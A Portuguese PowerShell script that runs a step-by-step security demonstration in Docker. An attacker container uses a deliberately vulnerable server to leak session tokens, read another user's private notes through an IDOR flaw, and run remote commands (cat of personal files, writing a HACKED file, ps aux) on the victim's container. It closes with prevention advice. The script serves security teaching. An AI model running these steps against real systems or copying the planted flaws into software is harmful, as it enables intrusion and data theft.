# =====================================================================
# SCRIPT DE DEMONSTRAÇÃO: ATAQUE LATERAL VIA SERVIDOR
# User2 (atacante) invade User1 (vítima) usando o Server como ponte
# 
# Cada etapa aguarda ENTER do apresentador e possui time-sleeps
# para facilitar o acompanhamento visual dos logs.
# =====================================================================

# ─────────────────────────────────────────────
# FUNÇÕES DE FORMATAÇÃO
# ─────────────────────────────────────────────
function Escrever-Banner {
    param([string]$texto)
    Write-Host ""
    Write-Host ""
    Write-Host "╔══════════════════════════════════════════════════════════════════╗" -ForegroundColor Red
    Write-Host "║                                                                  ║" -ForegroundColor Red
    Write-Host "║  $texto" -NoNewline -ForegroundColor Yellow
    $padding = 66 - $texto.Length - 2
    if ($padding -gt 0) { Write-Host (" " * $padding) -NoNewline -ForegroundColor Red }
    Write-Host "║" -ForegroundColor Red
    Write-Host "║                                                                  ║" -ForegroundColor Red
    Write-Host "╚══════════════════════════════════════════════════════════════════╝" -ForegroundColor Red
    Write-Host ""
}

function Escrever-Etapa {
    param([string]$numero, [string]$titulo)
    Write-Host ""
    Write-Host "══════════════════════════════════════════════════════════════════" -ForegroundColor DarkCyan
    Write-Host "  ETAPA $numero — $titulo" -ForegroundColor Cyan
    Write-Host "══════════════════════════════════════════════════════════════════" -ForegroundColor DarkCyan
}

function Escrever-Log {
    param([string]$tag, [string]$mensagem, [string]$cor = "White")
    $timestamp = Get-Date -Format "HH:mm:ss"
    Write-Host "  [$timestamp]" -NoNewline -ForegroundColor DarkGray
    Write-Host " [$tag] " -NoNewline -ForegroundColor Cyan
    Write-Host $mensagem -ForegroundColor $cor
}

function Escrever-Alerta {
    param([string]$mensagem)
    Write-Host ""
    Write-Host "  ⚠️  $mensagem" -ForegroundColor Red
    Write-Host ""
}

function Escrever-Sucesso {
    param([string]$mensagem)
    Write-Host "  ✅ $mensagem" -ForegroundColor Green
}

function Escrever-Atacante {
    param([string]$mensagem)
    Write-Host "  🔴 [ATACANTE] $mensagem" -ForegroundColor Magenta
}

function Escrever-Vitima {
    param([string]$mensagem)
    Write-Host "  🟢 [VÍTIMA]   $mensagem" -ForegroundColor Green
}

function Escrever-Server {
    param([string]$mensagem)
    Write-Host "  🟡 [SERVER]   $mensagem" -ForegroundColor Yellow
}

function Aguardar-Permissao {
    param([string]$proxima_etapa)
    Write-Host ""
    Write-Host "  ────────────────────────────────────────────────────────────" -ForegroundColor DarkGray
    Write-Host "  📋 Próxima etapa: $proxima_etapa" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  Pressione ENTER para prosseguir..." -ForegroundColor White -NoNewline
    Read-Host
    Write-Host ""
}

# ─────────────────────────────────────────────
# FUNÇÃO AUXILIAR: HTTP POST via Docker
# Usa base64 para evitar problemas de quoting
# entre PowerShell → Docker → curl
# ─────────────────────────────────────────────
function Docker-CurlPost {
    param(
        [string]$Container,
        [string]$Url,
        [string]$JsonBody
    )
    $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($JsonBody))
    $result = docker exec $Container sh -c "echo $b64 | base64 -d | curl -s -X POST $Url -H 'Content-Type: application/json' -d @-"
    return $result
}

function Docker-CurlGet {
    param(
        [string]$Container,
        [string]$Url
    )
    $result = docker exec $Container curl -sf $Url
    return $result
}

# ─────────────────────────────────────────────
# BANNER PRINCIPAL
# ─────────────────────────────────────────────
Clear-Host
Write-Host ""
Write-Host "  ██████╗ ███████╗███╗   ███╗ ██████╗ " -ForegroundColor Red
Write-Host "  ██╔══██╗██╔════╝████╗ ████║██╔═══██╗" -ForegroundColor Red
Write-Host "  ██║  ██║█████╗  ██╔████╔██║██║   ██║" -ForegroundColor Red
Write-Host "  ██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║" -ForegroundColor Red
Write-Host "  ██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝" -ForegroundColor Red
Write-Host "  ╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ " -ForegroundColor Red
Write-Host ""
Write-Host "  ATAQUE LATERAL VIA SERVIDOR — DEMONSTRAÇÃO DE SEGURANÇA" -ForegroundColor Yellow
Write-Host "  Cenário: User2 invade User1 usando o Server como ponte" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  Arquitetura:" -ForegroundColor White
Write-Host "  ┌─────────────┐     ┌──────────────┐     ┌──────────────┐" -ForegroundColor DarkCyan
Write-Host "  │ USER1       │◄───►│ SERVER       │◄───►│ USER2        │" -ForegroundColor DarkCyan
Write-Host "  │ (Vítima)    │     │ (Ponte)      │     │ (Atacante)   │" -ForegroundColor DarkCyan
Write-Host "  │ 10.10.0.10  │     │ 10.10.0.100  │     │ 10.10.0.20   │" -ForegroundColor DarkCyan
Write-Host "  └─────────────┘     └──────────────┘     └──────────────┘" -ForegroundColor DarkCyan
Write-Host ""

Aguardar-Permissao "Iniciar containers e montar o ambiente"

# ═════════════════════════════════════════════════════════════════
# ETAPA 0: SUBIR OS CONTAINERS
# ═════════════════════════════════════════════════════════════════
Escrever-Etapa "0" "PREPARAÇÃO DO AMBIENTE"

Escrever-Log "DOCKER" "Construindo e iniciando os 3 containers..." "Yellow"
Write-Host ""

docker compose -f docker-compose.ataque.yml down --remove-orphans 2>$null
docker compose -f docker-compose.ataque.yml up --build -d 2>$null

Start-Sleep -Seconds 3

Write-Host ""
Escrever-Log "DOCKER" "Verificando status dos containers:" "White"
Write-Host ""
docker compose -f docker-compose.ataque.yml ps
Write-Host ""

Escrever-Log "REDE" "Aguardando User1 se registrar no servidor (10s)..." "Yellow"
Start-Sleep -Seconds 10

# Verificar se User1 está registrado
$sessions = Docker-CurlGet -Container "user2" -Url "http://server:5000/admin/sessions" | ConvertFrom-Json
if ($sessions.total_sessions -ge 1) {
    Escrever-Sucesso "User1 está conectado e registrado no servidor!"
} else {
    Escrever-Alerta "User1 ainda não se registrou. Aguardando mais 10s..."
    Start-Sleep -Seconds 10
}

Aguardar-Permissao "Mostrar o uso legítimo do User1 no servidor"

# ═════════════════════════════════════════════════════════════════
# ETAPA 1: USER1 JÁ CONECTADO — MOSTRA USO LEGÍTIMO
# ═════════════════════════════════════════════════════════════════
Escrever-Etapa "1" "USER1 CONECTADO — USO LEGÍTIMO DO SERVIÇO"

Escrever-Vitima "O User1 se conectou normalmente ao servidor."
Start-Sleep -Seconds 2

Escrever-Vitima "Ele criou 3 notas pessoais com dados sensíveis:"
Start-Sleep -Seconds 1

Write-Host ""
$notasUser1 = Docker-CurlGet -Container "user2" -Url "http://server:5000/notes/user1" | ConvertFrom-Json

foreach ($nota in $notasUser1.notes) {
    Write-Host "    📝 " -NoNewline -ForegroundColor Green
    Write-Host "$($nota.title)" -NoNewline -ForegroundColor White
    Write-Host " — " -NoNewline -ForegroundColor DarkGray
    Write-Host "$($nota.content)" -ForegroundColor DarkGray
    Start-Sleep -Seconds 1
}

Write-Host ""
Escrever-Vitima "User1 acredita que suas notas são privadas e seguras."
Start-Sleep -Seconds 2
Escrever-Vitima "User1 tem dados sensíveis no filesystem local: /home/user1/documentos/"
Start-Sleep -Seconds 1

Aguardar-Permissao "User2 (atacante) se conecta ao servidor"

# ═════════════════════════════════════════════════════════════════
# ETAPA 2: USER2 SE CONECTA AO SERVIDOR
# ═════════════════════════════════════════════════════════════════
Escrever-Etapa "2" "USER2 (ATACANTE) SE CONECTA AO SERVIDOR"

Escrever-Atacante "User2 se registra no servidor como um usuário normal..."
Start-Sleep -Seconds 2

$registerJson = '{"username":"user2","ip_address":"10.10.0.20","hostname":"attacker-machine"}'
$registerResult = Docker-CurlPost -Container "user2" -Url "http://server:5000/register" -JsonBody $registerJson
$registerData = $registerResult | ConvertFrom-Json

Write-Host ""
Write-Host "    Resposta do servidor:" -ForegroundColor DarkGray
Write-Host "    Status:   $($registerData.status)" -ForegroundColor White
Write-Host "    Username: $($registerData.username)" -ForegroundColor White
Write-Host "    Token:    $($registerData.token)" -ForegroundColor White
Write-Host ""

Start-Sleep -Seconds 2
Escrever-Atacante "Registro concluído. Até aqui, tudo parece normal..."
Start-Sleep -Seconds 2
Escrever-Alerta "Mas o User2 é um atacante! Ele vai explorar as vulnerabilidades do servidor."

Aguardar-Permissao "User2 descobre sessões ativas (Vulnerabilidade #1)"

# ═════════════════════════════════════════════════════════════════
# ETAPA 3: RECONHECIMENTO — DESCOBRE SESSÕES ATIVAS
# ═════════════════════════════════════════════════════════════════
Escrever-Etapa "3" "RECONHECIMENTO — ENDPOINT /admin/sessions SEM AUTENTICAÇÃO"

Escrever-Atacante "User2 descobre o endpoint /admin/sessions..."
Start-Sleep -Seconds 2
Escrever-Atacante "Fazendo requisição: GET http://server:5000/admin/sessions"
Start-Sleep -Seconds 1

Write-Host ""
Write-Host "    curl -s http://server:5000/admin/sessions" -ForegroundColor DarkYellow
Write-Host ""
Start-Sleep -Seconds 2

$sessionsResult = Docker-CurlGet -Container "user2" -Url "http://server:5000/admin/sessions"
$sessionsJson = $sessionsResult | ConvertFrom-Json

Write-Host "    ┌─────────────────────────────────────────────────────────────┐" -ForegroundColor Red
Write-Host "    │  SESSÕES ATIVAS EXPOSTAS ($($sessionsJson.total_sessions) sessões encontradas)              │" -ForegroundColor Red
Write-Host "    └─────────────────────────────────────────────────────────────┘" -ForegroundColor Red
Write-Host ""

foreach ($session in $sessionsJson.sessions) {
    Write-Host "    👤 Username:  " -NoNewline -ForegroundColor White
    Write-Host "$($session.username)" -ForegroundColor Yellow
    Write-Host "       IP:        $($session.ip_address)" -ForegroundColor DarkGray
    Write-Host "       Hostname:  $($session.hostname)" -ForegroundColor DarkGray
    Write-Host "       Token:     $($session.token)" -ForegroundColor Red
    Write-Host "       Conectado: $($session.connected_at)" -ForegroundColor DarkGray
    Write-Host ""
    Start-Sleep -Seconds 1
}

Escrever-Alerta "O atacante agora sabe que 'user1' está conectado no IP 10.10.0.10!"
Start-Sleep -Seconds 2
Escrever-Atacante "Ele também obteve o token de sessão do User1!"

Aguardar-Permissao "User2 acessa as notas privadas do User1 (Vulnerabilidade #2)"

# ═════════════════════════════════════════════════════════════════
# ETAPA 4: ROUBO DE DADOS — LÊ NOTAS PRIVADAS DO USER1
# ═════════════════════════════════════════════════════════════════
Escrever-Etapa "4" "ROUBO DE DADOS — LEITURA DAS NOTAS PRIVADAS DO USER1"

Escrever-Atacante "User2 acessa as notas do User1 sem autorização..."
Start-Sleep -Seconds 2
Escrever-Atacante "Fazendo requisição: GET http://server:5000/notes/user1"
Start-Sleep -Seconds 1

Write-Host ""
Write-Host "    curl -s http://server:5000/notes/user1" -ForegroundColor DarkYellow
Write-Host ""
Start-Sleep -Seconds 2

$notasRoubadas = Docker-CurlGet -Container "user2" -Url "http://server:5000/notes/user1"
$notasJson = $notasRoubadas | ConvertFrom-Json

Write-Host "    ┌─────────────────────────────────────────────────────────────┐" -ForegroundColor Red
Write-Host "    │  DADOS PRIVADOS DO USER1 VAZADOS ($($notasJson.total_notes) notas roubadas)          │" -ForegroundColor Red
Write-Host "    └─────────────────────────────────────────────────────────────┘" -ForegroundColor Red
Write-Host ""

foreach ($nota in $notasJson.notes) {
    Write-Host "    🔓 " -NoNewline
    Write-Host "$($nota.title)" -ForegroundColor Red
    Write-Host "       $($nota.content)" -ForegroundColor Yellow
    Write-Host ""
    Start-Sleep -Seconds 2
}

Escrever-Alerta "Credenciais de banco, chaves de API e acessos VPN foram EXPOSTOS!"
Start-Sleep -Seconds 2

Aguardar-Permissao "User2 executa comando remoto na máquina do User1 (Vulnerabilidade #3)"

# ═════════════════════════════════════════════════════════════════
# ETAPA 5: EXECUÇÃO REMOTA — COMANDOS NA MÁQUINA DO USER1
# ═════════════════════════════════════════════════════════════════
Escrever-Etapa "5" "EXECUÇÃO REMOTA — COMANDOS NA MÁQUINA DO USER1"

Escrever-Atacante "Agora o User2 vai usar o endpoint /exec para executar comandos"
Escrever-Atacante "diretamente na máquina do User1, usando o servidor como ponte."
Start-Sleep -Seconds 3

# ─── Comando 1: Ler arquivo local do User1 ───
Escrever-Atacante "Comando 1: Ler arquivos pessoais do User1"
Write-Host ""
Write-Host '    curl -X POST http://server:5000/exec \' -ForegroundColor DarkYellow
Write-Host '      -d {"target_user":"user1", "command":"cat /home/user1/documentos/dados_pessoais.txt"}' -ForegroundColor DarkYellow
Write-Host ""
Start-Sleep -Seconds 2

$execBody1 = '{"target_user":"user1","command":"cat /home/user1/documentos/dados_pessoais.txt","requested_by":"user2"}'
$exec1 = Docker-CurlPost -Container "user2" -Url "http://server:5000/exec" -JsonBody $execBody1
$exec1Json = $exec1 | ConvertFrom-Json
$cmdId1 = $exec1Json.command_id

Escrever-Log "EXEC" "Comando #$cmdId1 enfileirado. Aguardando execução pelo agente do User1..." "Yellow"
Start-Sleep -Seconds 5

$result1 = Docker-CurlGet -Container "user2" -Url "http://server:5000/exec/result/$cmdId1"
$result1Json = $result1 | ConvertFrom-Json

Write-Host ""
Write-Host "    ┌─────────────────────────────────────────────────────────────┐" -ForegroundColor Red
Write-Host "    │  ARQUIVO LOCAL DO USER1 ACESSADO REMOTAMENTE               │" -ForegroundColor Red
Write-Host "    └─────────────────────────────────────────────────────────────┘" -ForegroundColor Red
Write-Host ""
Write-Host "    Status:    $($result1Json.status)" -ForegroundColor Yellow
Write-Host "    Resultado:" -ForegroundColor White
$result1Json.result -split "`n" | ForEach-Object {
    if ($_.Trim()) { Write-Host "      🔓 $_" -ForegroundColor Red }
}
Write-Host ""
Start-Sleep -Seconds 3

# ─── Comando 2: Escrever arquivo na máquina do User1 ───
Escrever-Atacante "Comando 2: Criar arquivo de prova na máquina do User1"
Write-Host ""
Write-Host '    curl -X POST http://server:5000/exec \' -ForegroundColor DarkYellow
Write-Host '      -d {"target_user":"user1", "command":"echo HACKED > /tmp/HACKED.txt"}' -ForegroundColor DarkYellow
Write-Host ""
Start-Sleep -Seconds 2

$dataAtaque = Get-Date -Format "dd/MM/yyyy HH:mm:ss"
$execBody2 = '{"target_user":"user1","command":"echo VOCE FOI HACKEADO pelo User2 em ' + $dataAtaque + ' > /tmp/HACKED.txt && echo Arquivo criado com sucesso","requested_by":"user2"}'
$exec2 = Docker-CurlPost -Container "user2" -Url "http://server:5000/exec" -JsonBody $execBody2
$exec2Json = $exec2 | ConvertFrom-Json
$cmdId2 = $exec2Json.command_id

Escrever-Log "EXEC" "Comando #$cmdId2 enfileirado. Aguardando execução..." "Yellow"
Start-Sleep -Seconds 5

$result2 = Docker-CurlGet -Container "user2" -Url "http://server:5000/exec/result/$cmdId2"
$result2Json = $result2 | ConvertFrom-Json

Write-Host ""
Write-Host "    Status:    $($result2Json.status)" -ForegroundColor Yellow
Write-Host "    Resultado: $($result2Json.result)" -ForegroundColor Red
Write-Host ""

Escrever-Alerta "O atacante escreveu um arquivo na máquina do User1!"
Start-Sleep -Seconds 2

# ─── Comando 3: Listar processos do User1 ───
Escrever-Atacante "Comando 3: Listar processos em execução no User1"
Start-Sleep -Seconds 1

$execBody3 = '{"target_user":"user1","command":"ps aux","requested_by":"user2"}'
$exec3 = Docker-CurlPost -Container "user2" -Url "http://server:5000/exec" -JsonBody $execBody3
$exec3Json = $exec3 | ConvertFrom-Json
$cmdId3 = $exec3Json.command_id

Escrever-Log "EXEC" "Comando #$cmdId3 enfileirado. Aguardando execução..." "Yellow"
Start-Sleep -Seconds 5

$result3 = Docker-CurlGet -Container "user2" -Url "http://server:5000/exec/result/$cmdId3"
$result3Json = $result3 | ConvertFrom-Json

Write-Host ""
Write-Host "    ┌─────────────────────────────────────────────────────────────┐" -ForegroundColor Red
Write-Host "    │  PROCESSOS DO USER1 EXPOSTOS                               │" -ForegroundColor Red
Write-Host "    └─────────────────────────────────────────────────────────────┘" -ForegroundColor Red
$result3Json.result -split "`n" | ForEach-Object {
    if ($_.Trim()) { Write-Host "    $_" -ForegroundColor DarkGray }
}
Write-Host ""
Start-Sleep -Seconds 2

Aguardar-Permissao "Verificação final — Provar que o ataque funcionou"

# ═════════════════════════════════════════════════════════════════
# ETAPA 6: VERIFICAÇÃO — PROVA DE INVASÃO
# ═════════════════════════════════════════════════════════════════
Escrever-Etapa "6" "VERIFICAÇÃO FINAL — PROVA DE INVASÃO"

Escrever-Log "PROVA" "Acessando diretamente o container do User1 para verificar o arquivo..." "Yellow"
Start-Sleep -Seconds 2

Write-Host ""
Write-Host "    docker exec user1 cat /tmp/HACKED.txt" -ForegroundColor DarkYellow
Write-Host ""
Start-Sleep -Seconds 2

$prova = docker exec user1 cat /tmp/HACKED.txt 2>&1

Write-Host "    ╔═════════════════════════════════════════════════════════════╗" -ForegroundColor Red
Write-Host "    ║  CONTEÚDO DO ARQUIVO /tmp/HACKED.txt NA MÁQUINA DO USER1  ║" -ForegroundColor Red
Write-Host "    ╠═════════════════════════════════════════════════════════════╣" -ForegroundColor Red
Write-Host "    ║                                                             ║" -ForegroundColor Red
Write-Host "    ║  $prova" -NoNewline -ForegroundColor Yellow
$paddingProva = 61 - ([string]$prova).Length
if ($paddingProva -gt 0) { Write-Host (" " * $paddingProva) -NoNewline }
Write-Host "║" -ForegroundColor Red
Write-Host "    ║                                                             ║" -ForegroundColor Red
Write-Host "    ╚═════════════════════════════════════════════════════════════╝" -ForegroundColor Red
Write-Host ""

Start-Sleep -Seconds 3

# ═════════════════════════════════════════════════════════════════
# RESUMO FINAL
# ═════════════════════════════════════════════════════════════════
Escrever-Banner "RESUMO DO ATAQUE"

Write-Host "  O User2 (atacante) conseguiu, usando apenas o servidor como ponte:" -ForegroundColor White
Write-Host ""
Write-Host "    1. 🔍 " -NoNewline -ForegroundColor Red
Write-Host "RECONHECIMENTO" -NoNewline -ForegroundColor Yellow
Write-Host " — Descobriu todas as sessões ativas e IPs" -ForegroundColor White
Start-Sleep -Seconds 1

Write-Host "    2. 📄 " -NoNewline -ForegroundColor Red
Write-Host "ROUBO DE DADOS " -NoNewline -ForegroundColor Yellow
Write-Host " — Leu notas privadas com credenciais sensíveis" -ForegroundColor White
Start-Sleep -Seconds 1

Write-Host "    3. 💻 " -NoNewline -ForegroundColor Red
Write-Host "ACESSO REMOTO  " -NoNewline -ForegroundColor Yellow
Write-Host " — Leu arquivos e executou comandos na máquina" -ForegroundColor White
Start-Sleep -Seconds 1

Write-Host "    4. ✏️  " -NoNewline -ForegroundColor Red
Write-Host "ESCRITA REMOTA " -NoNewline -ForegroundColor Yellow
Write-Host " — Gravou arquivo de prova no filesystem do User1" -ForegroundColor White
Start-Sleep -Seconds 2

Write-Host ""
Write-Host "  ══════════════════════════════════════════════════════════════════" -ForegroundColor DarkCyan
Write-Host "  VULNERABILIDADES EXPLORADAS:" -ForegroundColor Cyan
Write-Host "  ══════════════════════════════════════════════════════════════════" -ForegroundColor DarkCyan
Write-Host ""
Write-Host "    ⚠️  #1: Endpoint /admin/sessions sem autenticação" -ForegroundColor Red
Write-Host "    ⚠️  #2: Leitura de dados sem validação de autoria (IDOR)" -ForegroundColor Red
Write-Host "    ⚠️  #3: Execução remota sem autorização (sem verificar quem solicita)" -ForegroundColor Red
Write-Host ""

Write-Host "  ══════════════════════════════════════════════════════════════════" -ForegroundColor DarkGreen
Write-Host "  COMO PREVENIR:" -ForegroundColor Green
Write-Host "  ══════════════════════════════════════════════════════════════════" -ForegroundColor DarkGreen
Write-Host ""
Write-Host "    ✅ Autenticação em TODOS os endpoints (JWT, OAuth2, API Keys)" -ForegroundColor Green
Write-Host "    ✅ Autorização granular (RBAC): só o dono acessa seus dados" -ForegroundColor Green
Write-Host "    ✅ Princípio do menor privilégio nos agentes" -ForegroundColor Green
Write-Host "    ✅ Rate limiting e monitoramento de requisições suspeitas" -ForegroundColor Green
Write-Host "    ✅ Logs de auditoria com alertas em tempo real" -ForegroundColor Green
Write-Host ""
Write-Host ""

# Cleanup opcional
Write-Host "  Para destruir o ambiente de demonstração:" -ForegroundColor DarkGray
Write-Host "  docker compose -f docker-compose.ataque.yml down --remove-orphans" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  Demonstração concluída!" -ForegroundColor Green
Write-Host ""
